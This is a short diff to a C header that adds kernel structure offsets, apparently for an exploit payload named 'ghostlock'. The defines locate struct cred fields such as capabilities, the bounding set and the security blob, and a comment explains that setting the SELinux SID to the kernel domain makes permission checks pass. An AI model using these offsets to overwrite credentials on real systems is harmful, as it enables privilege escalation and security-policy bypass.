@@ -110,10 +110,21 @@
 #define CRED_UID_OFF 8
 #define CRED_SECUREBITS_OFF 40
 #define CRED_CAPS_OFF 48
+#define CRED_CAP_BSET_OFF 72
 #define CRED_SECURITY_OFF 128
+#define CRED_USER_NS_OFF 144
+#define CRED_UCOUNTS_OFF 152
+#define CRED_GROUP_INFO_OFF 160
+/* struct cred has usage (atomic_long_t, 8 bytes), so the pointer fields sit at
+ * 0x80/0x88/0x90/0x98/0xa0 = security/user/user_ns/ucounts/group_info and the
+ * whole struct is 0xb0 -- which is exactly the profile's cred.copy_size (176). */
+#define CRED_SEC_BLOB_DELTA (::ghostlock::target::payload::kCredSecurityBlobDelta)
 #define SELINUX_CRED_BLOB_OFF 0
 #define SELINUX_CRED_OSID_OFF 0
 #define SELINUX_CRED_SID_OFF 4
+/* Initial SID for the kernel domain: a *valid* sid, so the sidtab lookup in
+ * avc_has_perm() succeeds and the permissive verdict applies. */
+#define SECINITSID_KERNEL 1
 #define SECCOMP_MODE_OFF 0x00
 #define SECCOMP_FILTER_COUNT_OFF 0x04
 #define SECCOMP_FILTER_OFF 0x08
